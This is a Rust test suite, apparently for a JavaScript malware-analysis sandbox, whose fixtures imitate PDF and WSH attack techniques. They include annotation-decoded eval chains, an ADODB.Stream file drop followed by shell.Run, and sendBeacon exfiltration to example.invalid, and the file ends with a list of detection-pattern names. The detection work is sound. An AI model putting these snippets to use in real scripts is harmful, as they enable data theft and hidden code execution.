        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_short_circuits_repetitive_probe_loops() {
    let options = DynamicOptions::default();
    let payload = b"
        var f = new ActiveXObject('Scripting.FileSystemObject');
        var i = 0;
        while (!f.FolderExists('C:/temp') && i < 2000) { i++; }
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .calls
                .iter()
                .any(|call| call == "Scripting.FileSystemObject.FolderExists"));
            assert!(signals.execution_stats.probe_loop_short_circuit_hits > 0);
            assert_eq!(signals.execution_stats.adaptive_loop_profile, "host_probe");
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_suppresses_runtime_limit_for_sentinel_spin_with_wsh_calls() {
    let options = DynamicOptions::default();
    let payload = b"
        var shell = WScript.CreateObject('WScript.Shell');
        var tempPath = shell.ExpandEnvironmentStrings('%TEMP%');
        var shellApp = new ActiveXObject('Shell.Application');
        shellApp.NameSpace(7);
        var tone = 1;
        while (true) {
            tone = tone + 1;
            if (tone == 300000000) {
                break;
            }
        }
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|call| call == "WScript.CreateObject"));
            assert!(signals
                .calls
                .iter()
                .any(|call| call == "WScript.Shell.ExpandEnvironmentStrings"));
            assert_eq!(signals.execution_stats.adaptive_loop_profile, "sentinel_spin");
            assert!(
                !signals
                    .errors
                    .iter()
                    .any(|error| error.to_ascii_lowercase().contains("loop iteration limit")),
                "unexpected loop limit error: {:?}",
                signals.errors
            );
            assert!(signals.execution_stats.probe_loop_short_circuit_hits > 0);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_busy_wait_increment_loop_profile() {
    let options = DynamicOptions::default();
    let payload = b"
        var spin = 0;
        while (spin < 999999) { spin++; }
        var xhr = WScript.CreateObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.test/counter', false);
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|call| call == "WScript.CreateObject"));
            assert!(signals.calls.iter().any(|call| call == "MSXML2.XMLHTTP.open"));
            assert!(
                !signals
                    .errors
                    .iter()
                    .any(|error| error.to_ascii_lowercase().contains("loop iteration limit")),
                "unexpected loop limit error: {:?}",
                signals.errors
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_deduped_lists_are_deterministically_sorted() {
    let options = DynamicOptions::default();
    let payload = b"
        app.newDoc();
        app.launchURL('http://example.test/a');
        app.launchURL('http://example.test/a');
        app.createDataObject({ cName: 'x' });
        app.exportAsFDF();
        app.newDoc();
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let mut sorted_urls = signals.urls.clone();
            sorted_urls.sort();
            sorted_urls.dedup();
            assert_eq!(signals.urls, sorted_urls);

            let mut sorted_domains = signals.domains.clone();
            sorted_domains.sort();
            sorted_domains.dedup();
            assert_eq!(signals.domains, sorted_domains);

            let mut sorted = signals.prop_writes.clone();
            sorted.sort();
            sorted.dedup();
            assert_eq!(signals.prop_writes, sorted);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_app_doc_annots_payload() {
    let options = DynamicOptions::default();
    let payload = b"var z; var y; z = y = app.doc; y = 0; z.syncAnnotScan(); y = z; var p = y.getAnnots({ nPage: 0 }); var s = p[0].subject; var l = s.replace(/z/g, '%'); s = unescape(l); eval(s); s = ''; z = 1;";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "doc.syncAnnotScan"));
            assert!(signals.calls.iter().any(|c| c == "doc.getAnnots"));
            assert!(signals.calls.iter().any(|c| c == "alert"));
            assert!(signals.prop_reads.iter().any(|p| p == "app.doc"));
            assert!(signals.prop_reads.iter().any(|p| p == "annot.subject"));
            assert!(!signals
                .errors
                .iter()
                .any(|e| e.contains("cannot convert 'null' or 'undefined' to object")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_app_plugins_eval_payloads() {
    let options = DynamicOptions::default();
    let payload = br#"var pr = null; var fnc = 'ev'; var sum = ''; app.doc.syncAnnotScan(); if (app.plugIns.length != 0) { var num = 1; pr = app.doc.getAnnots({ nPage: 0 }); sum = pr[num].subject; } var buf = ''; if (app.plugIns.length > 3) { fnc += 'a'; var arr = sum.split(/-/); for (var i = 1; i < arr.length; i++) { buf += String.fromCharCode('0x'+arr[i]); } fnc += 'l'; } if (app.plugIns.length >= 2) { app[fnc](buf); }"#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "doc.syncAnnotScan"));
            assert!(signals.calls.iter().any(|c| c == "doc.getAnnots"));
            assert!(signals.calls.iter().any(|c| c == "app.eval"));
            assert!(signals.prop_reads.iter().any(|p| p == "app.plugIns"));
            assert!(signals.prop_reads.iter().any(|p| p == "annot.subject"));
            assert!(!signals
                .errors
                .iter()
                .any(|e| e.contains("cannot convert 'null' or 'undefined' to object")));
            assert!(!signals.errors.iter().any(|e| e.contains("not a callable function")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_event_target_unescape_payload() {
    let options = DynamicOptions::default();
    let payload = b"var th = event.target; th.syncAnnotScan(); var p = th.getAnnots({ nPage: 0 }); var s = p[0].subject; var l = s.replace(/z/g, 'a%b'.replace(/[ab]/g, '')); s = th['unescape'](l); var e = th['eval']; e(s);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "event.target.syncAnnotScan"));
            assert!(signals.calls.iter().any(|c| c == "event.target.getAnnots"));
            assert!(signals.calls.iter().any(|c| c == "event.target.unescape"));
            assert!(signals.calls.iter().any(|c| c == "event.target.eval"));
            assert!(!signals
                .errors
                .iter()
                .any(|e| e.contains("cannot convert 'null' or 'undefined' to object")));
            assert!(!signals.errors.iter().any(|e| e.contains("not a callable function")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_viewer_version_collab_payload() {
    let options = DynamicOptions::default();
    let payload =
        b"var v = app.viewerVersion.toString(); v = v.replace(/\\D/g, ''); app.doc.Collab.getIcon('x');";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "Collab.getIcon"));
            assert!(signals.prop_reads.iter().any(|p| p == "app.doc"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_callable_app_properties() {
    let options = DynamicOptions::default();
    let payload = b"var v = app.viewerVersion(); var s = app.viewerVersion.toString(); var t = app.viewerType(); var l = app.plugIns.length;";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "app.viewerVersion"));
            assert!(signals.calls.iter().any(|c| c == "app.viewerType"));
            assert!(!signals.errors.iter().any(|e| e.contains("not a callable function")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_adbe_reader_payload() {
    let options = DynamicOptions::default();
    let payload = br#"if (typeof(xfa_installed) == "undefined" || typeof(xfa_version) == "undefined" || xfa_version < 2.1) { if (app.viewerType == "Reader") { if (ADBE.Reader_Value_Asked != true) { if (app.viewerVersion < 6.0) { if (app.alert(ADBE.Viewer_Form_string_Reader_5x, 1, 1) == 1) this.getURL(ADBE.Reader_Value_New_Version_URL + ADBE.SYSINFO, false); ADBE.Reader_Value_Asked = true; } else if (app.viewerVersion < 7.0) { if (app.alert(ADBE.Viewer_Form_string_Reader_601, 1, 1) == 1) app.findComponent({cType:"App", cName:"Reader7", cDesc: ADBE.Viewer_string_Update_Reader_Desc}); ADBE.Reader_Value_Asked = true; } else { if (app.alert(ADBE.Viewer_Form_string_Reader_6_7x, 1, 1) == 1) app.findComponent({cType:"Plugin", cName:"XFA", cDesc: ADBE.Viewer_string_Update_Reader_Desc}); ADBE.Reader_Value_Asked = true; } } } }"#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "alert"));
            assert!(!signals.errors.iter().any(|e| e.contains("ADBE is not defined")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_info_gkds_payload() {
    let options = DynamicOptions::default();
    let payload =
        b"m1=this.info.gkds; m2=m1.replace(/zzzzz/g, ''); m3=this.info.gggsd+'al'; app[m3](m2);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "app.eval"));
            assert!(!signals
                .errors
                .iter()
                .any(|e| e.contains("cannot convert 'null' or 'undefined' to object")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_recovers_undefined_string_vars() {
    let options = DynamicOptions::default();
    let payload = b"var out = str.replace(/a/g, '');";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.errors.is_empty());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_recovers_undefined_function_vars() {
    let options = DynamicOptions::default();
    let payload = b"var vvv = z(unescape(xxx)); eval(vvv);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.errors.is_empty());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_recovers_invalid_unicode_escapes() {
    let options = DynamicOptions::default();
    let payload = br#"var s = "\uZZZZ";"#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.errors.is_empty());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_page_word_helpers() {
    let options = DynamicOptions::default();
    let payload = b"var n = getPageNumWords(0); var w = getPageNthWord(0, 0, false);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "getPageNumWords"));
            assert!(signals.calls.iter().any(|c| c == "getPageNthWord"));
            assert!(signals.errors.is_empty());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_creator_subject_payloads() {
    let options = DynamicOptions::default();
    let payload = b"var b = this.creator; eval(unescape(this.creator.replace(/z/igm,'%'))); eval(unescape(this.subject.replace(/Hueputol/g, String.fromCharCode(0x3*0xC+0x1)).replace(/Dalbaeb/g,'B')));";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "eval"));
            assert!(signals.calls.iter().any(|c| c == "alert"));
            assert!(!signals.errors.iter().any(|e| e.contains("Eval error")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_media_run_guard() {
    let options = DynamicOptions::default();
    let payload = b"j = true; run(); this.media.newPlayer(null);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "run"));
            assert!(signals.calls.iter().any(|c| c == "media.newPlayer"));
            assert!(!signals.errors.iter().any(|e| e.contains("not a callable function")));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_supports_string_substr() {
    let options = DynamicOptions::default();
    let payload = br#""abc".substr(1);"#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "String.substr"));
            assert!(signals.errors.is_empty());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_get_annot() {
    let options = DynamicOptions::default();
    let payload = b"var a = this.getAnnot(0, '0001-0004'); if (a) { a.subject; }";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "getAnnot"));
            assert!(signals.prop_reads.iter().any(|p| p == "annot.subject"));
            assert!(signals.errors.is_empty());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_service_worker_persistence_abuse() {
    let options = DynamicOptions::default();
    let payload = br#"
        navigator.serviceWorker.register('/sw.js');
        navigator.serviceWorker.getRegistrations();
        self.addEventListener('fetch', function () {});
        caches.open('v1');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "service_worker_persistence_abuse"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_does_not_flag_service_worker_persistence_without_lifecycle_evidence() {
    let options = DynamicOptions::default();
    let payload = br#"
        navigator.serviceWorker.register('/sw.js');
        caches.open('v1');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(!signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "service_worker_persistence_abuse"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_webcrypto_key_staging_exfil() {
    let options = DynamicOptions::default();
    let payload = br#"
        crypto.subtle.generateKey('AES');
        crypto.subtle.exportKey('raw');
        navigator.sendBeacon('https://example.invalid/exfil', 'blob');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "webcrypto_key_staging_exfil"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_storage_backed_payload_staging() {
    let options = DynamicOptions::default();
    let payload = br#"
        localStorage.setItem('staged', "app.alert('x')");
        var staged = localStorage.getItem('staged');
        eval(staged);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "storage_backed_payload_staging"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_dynamic_module_graph_evasion() {
    let options = DynamicOptions::default();
    let payload = br#"
        var fs = require('fs');
        var path = require('path');
        path.join('a', 'b');
        eval('1');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "dynamic_module_graph_evasion"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_covert_realtime_channel_abuse() {
    let options = DynamicOptions::default();
    let payload = br#"
        RTCPeerConnection.createDataChannel('c2');
        var msg = String.fromCharCode(115,116,97,103,101);
        RTCDataChannel.send(msg);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let pattern = signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "covert_realtime_channel_abuse")
                .expect("covert_realtime_channel_abuse");
            assert!(pattern.metadata.contains_key("js.runtime.realtime.session_count"));
            assert!(pattern.metadata.contains_key("js.runtime.realtime.channel_types"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_clipboard_session_hijack_behaviour() {
    let options = DynamicOptions::default();
    let payload = br#"
        navigator.clipboard.readText();
        document.cookie();
        navigator.sendBeacon('https://example.invalid', 'token');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "clipboard_session_hijack_behaviour"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_dom_sink_policy_bypass_attempt() {
    let options = DynamicOptions::default();
    let payload = br#"
        trustedTypes.createPolicy('safe', {});
        document.setInnerHTML('<img src=x onerror=1>');
        eval('1');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "dom_sink_policy_bypass_attempt"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wasm_memory_unpacker_pipeline() {
    let options = DynamicOptions::default();
    let payload = br#"
        WebAssembly.instantiate('mod');
        WebAssembly.Memory({initial:1});
        Buffer.from('4141', 'hex');
        eval('1');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "wasm_memory_unpacker_pipeline"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_extension_api_abuse_probe() {
    let options = DynamicOptions::default();
    let payload = br#"
        chrome.runtime.sendMessage('hello');
        chrome.storage.local.get('key');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "extension_api_abuse_probe"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_modern_fingerprint_evasion() {
    let options = DynamicOptions::default();
    let payload = br#"
        navigator.userAgentData.getHighEntropyValues(['platform']);
        permissions.query({name: 'notifications'});
        WebGLRenderingContext.getParameter(37445);
        AudioContext.createAnalyser();
        setTimeout(function () {}, 1);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "modern_fingerprint_evasion"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_dynamic_code_generation_pattern() {
    let options = DynamicOptions::default();
    let payload = b"eval('1'); eval('2'); setTimeout(function(){}, 1);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let pattern = signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "dynamic_code_generation")
                .expect("dynamic_code_generation pattern");
            assert!(pattern.confidence >= 0.4);
            assert!(pattern.severity == "Medium" || pattern.severity == "High");
            assert!(pattern.metadata.contains_key("eval_calls"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_obfuscated_string_construction_pattern() {
    let options = DynamicOptions::default();
    let payload =
        b"String.fromCharCode(65,66);String.fromCharCode(67,68);String.fromCharCode(69,70);String.fromCharCode(71,72);String.fromCharCode(73,74);String.fromCharCode(75,76);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let pattern = signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "obfuscated_string_construction")
                .expect("obfuscated_string_construction pattern");
            assert!(pattern.confidence >= 0.5);
            assert!(pattern.metadata.contains_key("char_code_calls"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_environment_fingerprinting_pattern() {
    let options = DynamicOptions::default();
    let payload = b"var a=info.title; var b=info.author; var c=info.subject;";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let pattern = signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "environment_fingerprinting")
                .expect("environment_fingerprinting pattern");
            assert!(pattern.confidence >= 0.40);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_error_recovery_patterns() {
    let options = DynamicOptions::default();
    let payload = b"var out = missingFn(payloadValue);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let pattern = signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "error_recovery_patterns")
                .expect("error_recovery_patterns pattern");
            assert!(pattern.confidence >= 0.5);
            assert!(pattern.metadata.contains_key("recovery_attempts"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_variable_promotion_detected_pattern() {
    let options = DynamicOptions::default();
    let payload = b"result = missingPromotedValue;";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let pattern = signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "variable_promotion_detected")
                .expect("variable_promotion_detected pattern");
            assert!(pattern.confidence >= 0.5);
            assert!(pattern.metadata.contains_key("promoted_variables"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_benign_does_not_flag_high_risk_patterns() {
    let options = DynamicOptions::default();
    let payload = b"var a = 1; var b = 2; app.alert(a + b);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let disallowed = [
                "dynamic_code_generation",
                "obfuscated_string_construction",
                "com_downloader_execution_chain",
                "chunked_data_exfil_pipeline",
                "credential_harvest_form_emulation",
            ];
            for name in disallowed {
                assert!(
                    !signals.behavioral_patterns.iter().any(|pattern| pattern.name == name),
                    "benign payload unexpectedly flagged {}: {:?}",
                    name,
                    signals.behavioral_patterns
                );
            }
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_handles_edge_cases_without_crash() {
    let options = DynamicOptions::default();
    let cases: Vec<&[u8]> = vec![
        b"",
        "console.log('Привет');".as_bytes(),
        b"var a = '\0\0\0';",
        b"function { malformed",
    ];
    for case in cases {
        match js_analysis::run_sandbox(case, &options) {
            DynamicOutcome::Executed(_)
            | DynamicOutcome::Skipped { .. }
            | DynamicOutcome::TimedOut { .. } => {}
        }
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_chunked_data_exfil_pipeline() {
    let options = DynamicOptions::default();
    let payload = br#"
        var parts = [];
        parts.push('AA');
        parts.push('BB');
        var packed = btoa(parts.join(''));
        navigator.sendBeacon('https://example.invalid/a', packed);
        navigator.sendBeacon('https://example.invalid/b', packed);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let pattern = signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "chunked_data_exfil_pipeline")
                .expect("chunked_data_exfil_pipeline");
            assert!(pattern.metadata.contains_key("taint_edges"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_interaction_coercion_loop() {
    let options = DynamicOptions::default();
    let payload = br#"
        alert('Enable content to continue');
        confirm('Please allow now');
        prompt('Retry to continue');
        setTimeout(function () {}, 1);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "interaction_coercion_loop"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_lotl_api_chain_execution() {
    let options = DynamicOptions::default();
    let payload = br#"
        var shell = WScript.CreateObject('WScript.Shell');
        shell.ExpandEnvironmentStrings('%TEMP%');
        var stream = WScript.CreateObject('ADODB.Stream');
        stream.Open();
        stream.Write('MZ');
        stream.SaveToFile('C:\\Temp\\x.bin', 2);
        shell.Run('C:\\Temp\\x.bin', 0, false);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "lotl_api_chain_execution"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_expands_prototype_and_wasm_signals_in_browser_profile() {
    let mut browser_options = DynamicOptions::default();
    browser_options.runtime_profile.kind = RuntimeKind::Browser;
    browser_options.runtime_profile.mode = RuntimeMode::DeceptionHardened;

    let mut pdf_options = DynamicOptions::default();
    pdf_options.runtime_profile.kind = RuntimeKind::PdfReader;
    pdf_options.runtime_profile.mode = RuntimeMode::Compat;

    let payload = br#"
        eval("Object.prototype._x='1';var o={};o.__proto__._y=2;");
        WebAssembly.instantiate('mod');
        WebAssembly.Table({initial:1, element:'anyfunc'});
        eval('1');
    "#;

    let browser = js_analysis::run_sandbox(payload, &browser_options);
    let pdf = js_analysis::run_sandbox(payload, &pdf_options);
    match (browser, pdf) {
        (DynamicOutcome::Executed(browser_signals), DynamicOutcome::Executed(pdf_signals)) => {
            let browser_proto = browser_signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "prototype_chain_execution_hijack")
                .expect("browser prototype pattern");
            let browser_wasm = browser_signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "wasm_loader_staging")
                .expect("browser wasm pattern");
            let pdf_wasm = pdf_signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "wasm_loader_staging")
                .expect("pdf wasm pattern");
            assert!(browser_proto
                .metadata
                .get("expanded_profile")
                .map(|value| value == "true")
                .unwrap_or(false));
            assert!(browser_wasm.confidence >= pdf_wasm.confidence);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_pr19_api_sequence_and_complexity_patterns() {
    let options = DynamicOptions::default();
    let payload = br#"
        var notes = getAnnots(0);
        var encoded = '%61%6c%65%72%74%28%31%29';
        var decoded = unescape(encoded);
        var wrapped = btoa(decoded);
        var rebuilt = atob(wrapped);
        eval(rebuilt);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "api_call_sequence_malicious"));
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "source_sink_complexity"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_pr19_materialisation_pattern() {
    let options = DynamicOptions::default();
    let payload = br#"
        var a = String.fromCharCode(97,108,101,114,116);
        var b = String.fromCharCode(40,49,41);
        var c = a.concat(b);
        eval(c);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "dynamic_string_materialisation_sink"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_pr19_entropy_at_sink_pattern() {
    let options = DynamicOptions::default();
    let payload = br#"
        var stage = 'A9z!Q7m$R2n#T5p@L8v%K4x^H1c&N6w*D3y(0)';
        eval(stage);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals
                .behavioral_patterns
                .iter()
                .any(|pattern| pattern.name == "entropy_at_sink"));
        }
        _ => panic!("expected executed"),
    }
}

// ---------------------------------------------------------------------------
// Negative tests: benign JavaScript fixtures that MUST NOT trigger high-risk
// behavioural patterns.  These guard against false-positive regressions.
// ---------------------------------------------------------------------------

/// High-risk pattern names that benign payloads must never trigger.
#[cfg(feature = "js-sandbox")]
const HIGH_RISK_PATTERNS: &[&str] = &[
    "dynamic_code_generation",
    "obfuscated_string_construction",
    "indirect_dynamic_eval_dispatch",
    "multi_pass_decode_pipeline",
    "covert_beacon_exfil",
    "prototype_chain_execution_hijack",
    "wasm_loader_staging",
    "runtime_dependency_loader_abuse",
    "credential_harvest_form_emulation",
    "com_downloader_execution_chain",
    "com_downloader_staging_chain",
    "com_downloader_network_chain",
    "com_downloader_direct_execution_chain",
    "wsh_environment_gating",
    "wsh_direct_run_execution",
    "wsh_com_object_probe",
    "com_file_drop_staging",
    "com_network_buffer_staging",
    "com_downloader_partial_staging_chain",
    "wsh_filesystem_recon_probe",
    "lotl_api_chain_execution",
    "chunked_data_exfil_pipeline",
    "webcrypto_key_staging_exfil",
    "storage_backed_payload_staging",
    "clipboard_session_hijack_behaviour",
